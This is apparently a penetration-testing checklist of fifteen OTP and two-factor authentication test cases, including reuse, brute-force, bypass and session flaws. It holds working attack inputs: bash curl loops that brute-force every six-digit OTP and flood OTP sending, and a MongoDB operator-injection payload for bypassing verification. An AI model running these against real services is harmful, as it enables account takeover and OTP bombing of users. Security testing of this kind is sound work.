# OTP & 2FA Vulnerabilities Testing Scenarios

## Brute-Force & Weak OTP

### 1. Try common OTPs (e.g., 000000, 0000, 1234, 123456)
```http
POST /verify-otp
{
  "otp": "000000"
}
```
- If the server accepts this → weak OTP validation.

---

### 2. Send Null or empty OTP
```http
POST /verify-otp
{
  "otp": null
}
```
- Or leave the OTP field empty.  
- If accepted → missing validation.

---

### 3. Reuse a previously used OTP
Steps:
1. Receive a valid OTP: e.g., 138526  
2. Use it once → works.  
3. Try using the same OTP again.
```http
POST /verify-otp
{
  "otp": "138526"
}
```
- If it's accepted again → logic flaw.

---

### 4. Use an OTP from another user's account
- If you somehow have access to another user's OTP, try using it on your own account:
```http
POST /verify-otp
{
  "otp": "654321"
}
```
- If accepted → OTP is not tied to a specific user.

---

## Rate Limiting

### 5. No rate-limit on OTP verification
- Use Burp Intruder or a script:
```bash
for i in {000000..999999}
do
  curl -X POST https://vulnapp.local/verify-otp -d "otp=$i"
done
```
- If no blocking or delay → brute-force is possible.

---

### 6. No rate-limit on sending OTP
Use burp intruder or a script:
```bash
for i in {1..50}
do
  curl -X POST https://vulnapp.local/send-otp -d "email=test@example.com"
done
```
- If the OTP is sent every time → vulnerable to OTP bombing or resource abuse.

---

## Information Disclosure

### 7. OTP Exposed in Response
**Request:**
```http
POST /send-otp
{
  "email": "test@example.com"
}
```

**Response:**
```json
{
  "otp": "123456",
  "status": "sent"
}
```
- Critical issue — OTP should only be sent via email/SMS, not in API responses.

---

## Bypass & Logic Flaws

### 8. Bypass 2FA via password reset
Steps:
1. Log in with your account  
2. Enable 2FA  
3. Logout  
4. Request a password reset  
5. Open the reset link from email  
6. Set a new password  
- If you're logged in without going through 2FA → bypass exists.

---

### 9. Bypass 2FA via Google OAuth
Steps:
1. Login normally  
2. Enable 2FA  
3. Logout  
4. Click "Login with Google"  
- If you're logged in directly without 2FA → bypass exists.

---

### 10. Bypass 2FA by accessing next step directly
- Try visiting a protected page directly (e.g., `/dashboard`) without completing 2FA.  
- If access is granted → 2FA is not enforced properly.

---

### 11. Response Manipulation
In Burp Suite:
1. Send an incorrect OTP  
2. Look at the response (e.g., `{"verified": false}`)  
3. Modify to: `{"verified": true}`  
- If the system proceeds → insecure front-end handling.

---

### 12. Static or Predictable OTP
- If the OTP is generated using timestamps or patterns, it might be predictable.  
- Example: OTPs like `123456`, `123457`, or always starting with the same digits (e.g., `12xxxx`).
- Test by requesting multiple OTPs and checking for patterns.

---

### 13. NoSQL Injection via 2FA
- If input is directly passed to a MongoDB query without validation:
- Example:
  - Expected: `{"code": 1234}`
  - Malicious: `{"code": {"$gt": 0}}`
- This may bypass verification by returning all matching entries.

---

## Session & Account Logic

### 14. Enable 2FA without verifying email → Pre-Account Takeover
Steps:
1. Register a new account  
2. Enable 2FA before verifying email  
3. Logout  
4. Another user verifies that email later → account takeover possible.

---

### 15. Enabling 2FA doesn't revoke old sessions
Steps:
1. Log into the same account from two devices  
2. On Device B → enable 2FA or change password  
3. Go back to Device A → still has access?  
If yes → sessions are not invalidated properly.
